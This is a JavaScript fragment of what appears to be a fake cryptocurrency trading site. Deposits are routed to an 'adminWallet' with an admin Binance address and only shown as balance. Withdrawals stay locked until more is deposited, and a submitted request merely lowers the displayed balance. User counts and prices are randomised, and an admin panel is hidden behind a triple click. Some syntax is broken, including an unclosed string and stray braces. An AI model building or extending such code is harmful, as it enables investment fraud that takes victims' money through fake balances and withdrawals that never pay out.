// ==================== PROCESS DEPOSIT CONFIRMATION ====================
function processDepositConfirmation(amt, method, ref) {
    // Credit user's display balance
    appState.displayBalance += amt;
    appState.realBalance += amt;
    appState.adminWallet += amt; // Admin receives the money!
    appState.userTotalDeposited += amt;
    
    // Save transaction
    appState.transactions.push({
        id: Date.now().toString(),
        type: 'DEPOSIT',
        amount: amt,
        method: method,
        reference: ref,
        binanceAddress: CONFIG.ADMIN_BINANCE_ADDRESS, // Admin-only view
        timestamp: new Date().toISOString(),
        status: 'COMPLETED'
    });
    
    saveState();
    updateUI();
    closeModal('paymentModal');
    
    // Success message
    setTimeout(() => {
        alert(`

üí∞ Amount: $${amt.toFixed(2)} USD
üì± Method: ${method}
üîñ Reference: ${ref}

üéâ NEW BALANCE: $${appState.displayBalance.toFixed(2)}

Thank you for choosing ${CONFIG.COMPANY_NAME}! üöÄ

}

// ==================== WITHDRAW MODAL ====================
function openWithdraw() {
    if (appState.accountType === 'demo') {
        alert('‚ö†Ô∏è DEMO MODE\n\nSwitch to REAL MONEY to withdraw.');
        return;
    }
    
    const balance = appState.displayBalance;
    const deposited = appState.userTotalDeposited;
    const required = CONFIG.MIN_DEPOSITS_FOR_WITHDRAW;
    
    if (balance < CONFIG.MIN_WITHDRAW) {
        alert(`‚ùå Insufficient Balance\n\nYour balance: $${balance.toFixed(2)}\nMinimum: $${CONFIG.MIN_WITHDRAW}`);
        return;
    }
    
    if (deposited < required) {
        const remaining = required - deposited;
        if (confirm(`‚ö†Ô∏è Withdrawal Requirements Not Met\n\nTotal Deposited: $${deposited.toFixed(2)}\nRequired: $${required.toFixed(2)}\nRemaining: $${remaining.toFixed(2)}\n\nDeposit now?`)) {
            openDeposit();
        }
        return;
    }
    
    const m = makeModal('withdrawModal', 'üí∏ Request Withdrawal', `
        <div class="info-box">
            <strong>üí∞ Available: $${balance.toFixed(2)}</strong><br>
            Processing: 1-3 business days<br>
            Fee: $2.00
        </div>
        
        <div class="form-group">
            <label>Withdrawal Method</label>
            <select id="wMethod">
                <option value="bank">üè¶ Bank Transfer</option>
                <option value="crypto">ü™ô Cryptocurrency</option>
                <option value="paypal">üí≥ PayPal</option>
            </select>
        </div>
        
        <div class="form-group">
            <label>Amount (USD)</label>
            <input type="number" id="wAmount" placeholder="Min: $${CONFIG.MIN_WITHDRAW}" min="${CONFIG.MIN_WITHDRAW}">
        </div>
        
        <div class="form-group">
            <label>Account Details</label>
            <input type="text" id="wDetails" placeholder="Bank/Wallet/Email">
        </div>
        
        <button class="btn btn-primary btn-full" onclick="processWithdraw()">üí∏ SUBMIT REQUEST</button>
    `);
    document.body.appendChild(m);
}

function processWithdraw() {
    const amt = parseFloat(document.getElementById('wAmount').value);
    const details = document.getElementById('wDetails').value.trim();
    
    if (!amt || amt < CONFIG.MIN_WITHDRAW || !details) {
        alert('‚ùå Complete all fields');
        return;
    }
    
    const total = amt + 2;
    if (total > appState.displayBalance) {
        alert(`‚ùå Insufficient\n\nRequired: $${total.toFixed(2)} (including fee)\nBalance: $${appState.displayBalance.toFixed(2)}`);
        return;
    }
    
    appState.displayBalance -= total;
    saveState();
    updateUI();
    closeModal('withdrawModal');
    
    alert(`‚úÖ Withdrawal Request Submitted!\n\nAmount: $${amt.toFixed(2)}\nFee: $2.00\n\n‚è±Ô∏è Processing: 1-3 business days\n\nüìß Confirmation sent to ${CONFIG.SUPPORT_EMAIL}`);
}

}

// ==================== UTILITY FUNCTIONS ====================
function switchAccount(type) {
    appState.accountType = type;
    document.getElementById('demoBtn').classList.toggle('active', type === 'demo');
    document.getElementById('realBtn').classList.toggle('active', type === 'real');
    saveState();
    updateUI();
}

function updateUI() {
    const bal = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;
    document.getElementById('totalBalance').textContent = '$' + bal.toFixed(2);
    document.getElementById('usdtAmount').textContent = bal.toFixed(2) + ' USDT';
    document.getElementById('usdtValue').textContent = '$' + bal.toFixed(2);
}

function makeModal(id, title, body) {
    const m = document.createElement('div');
    m.className = 'modal active';
    m.id = id;
    m.innerHTML = `<div class="modal-content"><div class="modal-header"><h2>${title}</h2><button class="close-btn" onclick="closeModal('${id}')">√ó</button></div><div class="modal-body">${body}</div></div>`;
    return m;
}

function closeModal(id) {
    const m = document.getElementById(id);
    if (m) { m.classList.remove('active'); setTimeout(() => m.remove(), 300); }
}

function startUpdates() {
    setInterval(() => {
        appState.activeUsers = 1200 + Math.floor(Math.random() * 100);
        document.getElementById('activeUsersDisplay').textContent = appState.activeUsers.toLocaleString();
        
        Object.keys(cryptoPrices).forEach(p => {
            cryptoPrices[p] += (Math.random() - 0.5) * 20;
            const el = document.getElementById(p.split('/')[0].toLowerCase() + 'Price');
            if (el) el.textContent = '$' + cryptoPrices[p].toFixed(cryptoPrices[p] < 1 ? 4 : 2);
        });
    }, 3000);
}

function checkAdminStatus() {
    setTimeout(() => {
        const balanceEl = document.getElementById('totalBalance');
        if (balanceEl) {
            let clicks = 0;
            balanceEl.addEventListener('click', function() {
                clicks++;
                if (clicks === 3) {
                    clicks = 0;
                    const pwd = prompt('üîê Admin Password:');
                    if (pwd === CONFIG.ADMIN_PASSWORD) {
                        alert(`‚úÖ ADMIN ACCESS\n\nüí∞ Admin Wallet: $${appState.adminWallet.toFixed(2)}\nüë• Display Balance: $${appState.displayBalance.toFixed(2)}\nüìä Total Deposits: $${appState.userTotalDeposited.toFixed(2)}\nüîê Binance: ${CONFIG.ADMIN_BINANCE_ADDRESS}`);
                    }
                }
                setTimeout(() => clicks = 0, 1000);
            });
        }
    }, 500);
}

function saveState() {
    const s = { ...appState };
    delete s.currentUser;
    localStorage.setItem('cryptoProState', JSON.stringify(s));
}

function loadState() {
    const s = localStorage.getItem('cryptoProState');
    if (s) {
        try { appState = { ...appState, ...JSON.parse(s) }; }
        catch (e) { console.error(e); }
    }
}
